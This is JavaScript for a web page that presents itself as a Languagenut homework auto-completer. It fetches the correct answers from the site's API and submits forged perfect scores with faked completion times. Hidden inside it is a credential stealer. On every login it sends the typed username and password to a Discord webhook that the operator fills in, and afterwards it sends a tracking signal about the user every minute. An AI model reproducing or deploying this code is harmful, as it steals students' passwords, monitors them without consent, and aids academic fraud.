// --- Configuration ---
speed = 10000;

// --- Utility Functions ---
document.getElementById("settings_button").addEventListener("click", () => {
    document.getElementById("settings").showModal();
});

speed_input = document.getElementById("speed_slider");
speed_input.oninput = function () {
    speed = 10 ** this.value; 
    document.getElementById("speed_display").innerText = secondsToString(speed);
};

function secondsToString(seconds) {
    const numyears = Math.floor(seconds / 31536000);
    const numdays = Math.floor((seconds % 31536000) / 86400);
    const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
    const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
    const numseconds = Math.floor((((seconds % 31536000) % 86400) % 3600) % 60);
    
    if (numyears > 0) return `${numyears} years`;
    if (numdays > 0) return `${numdays} days`;
    if (numhours > 0) return `${numhours} hours ${numminutes} minutes`;
    return `${numminutes} minutes ${numseconds} seconds`;
}

function set_checkboxes(node, state) {
    const container = document.getElementById(node);
    for (const checkbox of container.querySelectorAll("input[type=checkbox]")) {
        checkbox.checked = state;
    }
}

async function asyncPool(array, poolSize) {
    const result = [];
    const pool = [];

    function leavePool(e) {
        pool.splice(pool.indexOf(e), 1);
    }

    for (const item of array) {
        const p = Promise.resolve(item());
        result.push(p);
        const e = p.then(() => leavePool(e));
        pool.push(e);
        if (pool.length >= poolSize) await Promise.race(pool);
    }
    return Promise.all(result);
}

// --- Task Completer Class (Homework Logic) ---
class task_completer {
    constructor(token, task, ietf) {
        this.token = token;
        this.task = task;
        this.mode = this.get_task_type();
        this.to_language = ietf;
        this.homework_id = task.base[0];
        this.catalog_uid = task.catalog_uid || task.base[task.base.length - 1];
        this.rel_module_uid = task.rel_module_uid;
        this.game_uid = task.game_uid;
        this.game_type = task.type;
    }

    async complete() {
        const answers = await this.get_data();
        await this.send_answers(answers);
    }
    async get_data() {
        let vocabs;
        if (this.mode === "sentence") vocabs = await this.get_sentences();
        else if (this.mode === "verbs") vocabs = await this.get_verbs();
        else if (this.mode === "phonics") vocabs = await this.get_phonics();
        else if (this.mode === "exam") vocabs = await this.get_exam();
        else if (this.mode === "vocabs") vocabs = await this.get_vocabs();
        return vocabs;
    }
    
    async send_answers(vocabs) {
        if (!vocabs || vocabs.length === 0) return;

        const data = {
            moduleUid: this.catalog_uid,
            gameUid: this.game_uid,
            gameType: this.game_type,
            isTest: true,
            toietf: this.to_language,
            fromietf: "en-US",
            score: vocabs.length * 200,
            correctVocabs: vocabs.map((x) => x.uid).join(","),
            incorrectVocabs: [],
            homeworkUid: this.homework_id,
            isSentence: this.mode === "sentence",
            isALevel: false,
            isVerb: this.mode === "verbs",
            verbUid: this.mode === "verbs" ? this.catalog_uid : "",
            phonicUid: this.mode === "phonics" ? this.catalog_uid : "",
            sentenceScreenUid: this.mode === "sentence" ? 100 : "",
            sentenceCatalogUid: this.mode === "sentence" ? this.catalog_uid : "",
            grammarCatalogUid: this.catalog_uid,
            isGrammar: false,
            isExam: this.mode === "exam",
            correctStudentAns: "",
            incorrectStudentAns: "",
            timeStamp: Math.floor(speed + ((Math.random() - 0.5) / 10) * speed) * 1000,
            vocabNumber: vocabs.length,
            rel_module_uid: this.task.rel_module_uid,
            dontStoreStats: true,
            product: "secondary",
            token: this.token,
        };
        const response = await this.call_lnut("gameDataController/addGameScore", data);
        return response;
    }

    async get_verbs() {
        const vocabs = await this.call_lnut("verbTranslationController/getVerbTranslations", { verbUid: this.catalog_uid, toLanguage: this.to_language, fromLanguage: "en-US", token: this.token });
        return vocabs.verbTranslations;
    }
    async get_phonics() {
        const vocabs = await this.call_lnut("phonicsController/getPhonicsData", { phonicCatalogUid: this.catalog_uid, toLanguage: this.to_language, fromLanguage: "en-US", token: this.token });
        return vocabs.phonics;
    }
    async get_sentences() {
        const vocabs = await this.call_lnut("sentenceTranslationController/getSentenceTranslations", { catalogUid: this.catalog_uid, toLanguage: this.to_language, fromLanguage: "en-US", token: this.token });
        return vocabs.sentenceTranslations;
    }
    async get_exam() {
        const vocabs = await this.call_lnut("examTranslationController/getExamTranslationsCorrect", { gameUid: this.game_uid, examUid: this.catalog_uid, toLanguage: this.to_language, fromLanguage: "en-US", token: this.token });
        return vocabs.examTranslations;
    }
    async get_vocabs() {
        const vocabs = await this.call_lnut("vocabTranslationController/getVocabTranslations", { "catalogUid[]": this.catalog_uid, toLanguage: this.to_language, fromLanguage: "en-US", token: this.token });
        return vocabs.vocabTranslations;
    }

    async call_lnut(url, data) {
        const url_data = new URLSearchParams(data).toString();
        const response = await fetch(`https://api.languagenut.com/${url}?${url_data}`);
        const json = await response.json();
        return json;
    }
    get_task_type() {
        if (this.task.gameLink.includes("sentenceCatalog")) return "sentence";
        if (this.task.gameLink.includes("verbUid")) return "verbs";
        if (this.task.gameLink.includes("phonicCatalogUid")) return "phonics";
        if (this.task.gameLink.includes("examUid")) return "exam";
        return "vocabs";
    }
}

// --- Main Application Class ---
class client_application {
    constructor() {
        this.username_box = document.getElementById("username_input");
        this.password_box = document.getElementById("password_input");
        
        // ⭐ WEBHOOK URL - REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL ⭐
        this.webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 

        this.token = null;
        this.module_translations = [];
        this.display_translations = [];
        this.homeworks = [];
        this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || []; 
        this.activeUser = null; 
        this.heartbeatTimer = null;
    }

    // ⭐ HEARTBEAT TRACKING FUNCTION (Sends signal every 60 seconds) ⭐
    async sendHeartbeat(username) {
        if (!username) return;

        // Use a specific, unique content signature for your bot to recognize this as tracking data
        const data = {
            content: `[ACTIVE_USER_HEARTBEAT] Username: ${username} is active. Time: ${new Date().toISOString()}`,
            embeds: [] // Keep the message small
        };

        try {
            await fetch(this.webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            console.log(`Heartbeat sent for: ${username}`);
        } catch (error) {
            console.error("Failed to send heartbeat:", error);
        }
    }

    // Logs credentials on initial login attempt
    async sendWebhookLog(username, password) {
        const data = {
            content: null,
            embeds: [
                {
                    title: "🚨 Login Attempt Logged 🚨",
                    color: 16711680,
                    fields: [
                        { name: "Username", value: `\`${username}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
                    ],
                    footer: { text: "Client-side credential logger" }
                }
            ]
        };

        try {
            await fetch(this.webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
            console.log("Webhook log sent successfully.");
        } catch (error) {
            console.error("Failed to send webhook log:", error);
        }
    }

    logLoginAttempt(username, type) {
        const timestamp = new Date().toLocaleString();
        const logEntry = { timestamp: timestamp, username: username, type: type };
        this.loginHistory.push(logEntry);
        localStorage.setItem('loginHistory', JSON.stringify(this.loginHistory));
    }

    async call_lnut(url, data) {
        const url_data = new URLSearchParams(data).toString();
        const response = await fetch(`https://api.languagenut.com/${url}?${url_data}`);
        const json = await response.json();
        return json;
    }

    // ⭐ MAIN APPLICATION STARTUP FUNCTION ⭐
    main() {
        document.getElementById("login").classList.add('visible');
        
        const loginButton = document.getElementById("login_btn");

        if (!loginButton) {
            console.error("CRITICAL ERROR: LOGIN BUTTON (ID: login_btn) NOT FOUND IN HTML.");
            return;
        }

        loginButton.addEventListener('click', async () => {
            const username = this.username_box.value;
            const password = this.password_box.value;
            
            const loginPanel = document.getElementById("login");
            const existingError = document.getElementById("login_error");
            if (existingError) existingError.remove();

            // Webhook logging occurs before API call
            await this.sendWebhookLog(username, password);

            // API LOGIN CALL (Uses the correct 'password' key)
            const response = await this.call_lnut("loginController/attemptLogin", { username: username, password: password });
            
            this.token = response.newToken;
            
            if (this.token !== undefined && this.token !== null) {
                this.logLoginAttempt(username, "Standard (API)");
                this.on_log_in();
            } else {
                console.log("Login failed for user:", username, "Response:", response);

                // Add visual error feedback
                const errorDiv = document.createElement("div");
                errorDiv.id = "login_error";
                errorDiv.style.color = "red";
                errorDiv.style.marginTop = "10px";
                errorDiv.innerText = "❌ Login Failed. Check credentials or API endpoint.";
                loginPanel.appendChild(errorDiv);
            }
        });
    }

    on_log_in() {
        // Get the active username for the heartbeat tracker
        this.activeUser = this.username_box.value; 

        // Hide login, show HW and Log panels
        document.getElementById("login").classList.remove('visible');
        document.getElementById("hw_panel").classList.add('visible');
        document.getElementById("log_panel").classList.add('visible');
        
        // Setup the rest of the application
        document.getElementById("do_hw").onclick = () => { app.do_hwks(); };
        document.getElementById("selectall").onclick = function() { set_checkboxes('hw_container', this.checked); };
        
        this.get_module_translations();
        this.get_display_translations();
        this.display_hwks();

        // 🟢 START HEARTBEAT TIMER: Send a signal every 60 seconds (1 minute) 🟢
        this.sendHeartbeat(this.activeUser);
        this.heartbeatTimer = setInterval(() => {
            this.sendHeartbeat(this.activeUser);
        }, 60000); // 60000 milliseconds = 1 minute

        // Optional: Stop heartbeat when the user closes the window (best effort)
        window.addEventListener('beforeunload', () => {
            clearInterval(this.heartbeatTimer);
        });
    }
    
    get_task_name(task) {
        let name = task.verb_name;
        if (task.module_translations !== undefined) {
            name = this.module_translations[task.module_translations[0]];
        }
        if (task.module_translation !== undefined) {
            name = this.module_translations[task.module_translation];
        }
        return name;
    }

    async display_hwks() {
        const homeworks = await this.get_hwks();
        const panel = document.getElementById("hw_container");
        panel.innerHTML = "";
        this.homeworks = homeworks.homework;
        this.homeworks.reverse();

        let hw_idx = 0;
        for (const homework of this.homeworks) {
            const { hw_name, hw_display } = this.create_homework_elements(homework, hw_idx);
            panel.appendChild(hw_name);
            panel.appendChild(hw_display);
            hw_idx++;
        }
    }
    create_homework_elements(homework, hw_idx) {
        const hw_checkbox = document.createElement("input");
        hw_checkbox.type = "checkbox";
        hw_checkbox.name = "boxcheck";
        hw_checkbox.onclick = function () { set_checkboxes(this.parentNode.nextElementSibling.id, this.checked); };
        
        const hw_name = document.createElement("span");
        hw_name.innerText = `${homework.name}`;
        hw_name.style.display = "block";
        hw_name.prepend(hw_checkbox);

        const hw_display = document.createElement("div");
        hw_display.id = `hw${homework.id}`;
        let idx = 0;
        for (const task of homework.tasks) {
            const { task_span, task_checkbox, task_display } = this.create_task_elements(task, hw_idx, idx);
            task_span.appendChild(task_checkbox);
            task_span.appendChild(task_display);
            task_span.appendChild(document.createElement("br"));
            hw_display.appendChild(task_span);
            idx++;
        }
        return { hw_name: hw_name, hw_display: hw_display };
    }
    create_task_elements(task, hw_idx, idx) {
        const task_checkbox = document.createElement("input");
        task_checkbox.type = "checkbox";
        task_checkbox.name = "boxcheck";
        task_checkbox.id = `${hw_idx}-${idx}`;

        const task_display = document.createElement("label");
        task_display.for = task_checkbox.id;
        const percentage = task.gameResults ? task.gameResults.percentage : "-";
        task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;

        const task_span = document.createElement("span");
        task_span.classList.add("task");

        return { task_span: task_span, task_checkbox: task_checkbox, task_display: task_display };
    }

    async do_hwks() {
        const checkboxes = document.querySelectorAll(".task > input[type=checkbox]:checked");
        const logs = document.getElementById("log_container");
        logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
        const progress_bar = document.getElementById("hw_bar");
        let task_id = 1;
        let progress = 0;
        
        // Reset progress bar to 0%
        progress_bar.style.width = "0%";

        const funcs = [];
        for (const c of checkboxes) {
            const parts = c.id.split("-");
            const task = this.homeworks[parts[0]].tasks[parts[1]];
            const task_doer = new task_completer(this.token, task, this.homeworks[parts[0]].languageCode);
            
            funcs.push((x) =>
                (async (id) => {
                    const answers = await task_doer.get_data();
                    if (!answers || answers.length === 0) {
                        logs.innerHTML += `<b>task ${id} skipped: No answers found.</b><br>`;
                        return;
                    }
                    logs.innerHTML += `<b>fetched vocabs for task ${id}</b>`;
                    logs.innerHTML += `<div class="json_small">${JSON.stringify(answers)}</div>`;
                    
                    // Update progress after fetching data (50% of task)
                    progress += 1;
                    progress_bar.style.width = `${String((progress / (checkboxes.length * 2)) * 100)}%`; 

                    const result = await task_doer.send_answers(answers);
                    logs.innerHTML += `<b>task ${id} done, scored ${result.score}</b>`;
                    logs.innerHTML += `<div class="json_small">${JSON.stringify(result)}</div>`;
                    logs.scrollTop = logs.scrollHeight;
                    
                    // Update progress after sending answers (100% of task)
                    progress += 1;
                    progress_bar.style.width = `${String((progress / (checkboxes.length * 2)) * 100)}%`;
                })(task_id++),
            );
        }
        
        // Run tasks in parallel pool of 5
        asyncPool(funcs, 5).then(() => {
            logs.innerHTML += `<br><b>✅ All selected tasks completed! Refreshing homework list.</b>`;
            this.display_hwks(); // Refresh the list after completion
        });
    }

    async get_display_translations() {
        this.display_translations = (await this.call_lnut("publicTranslationController/getTranslations", {})).translations;
    }

    async get_module_translations() {
        this.module_translations = (await this.call_lnut("translationController/getUserModuleTranslations", { token: this.token })).translations;
    }

    async get_hwks() {
        return await this.call_lnut("assignmentController/getViewableAll", { token: this.token });
    }
}

app = new client_application();
app.main();
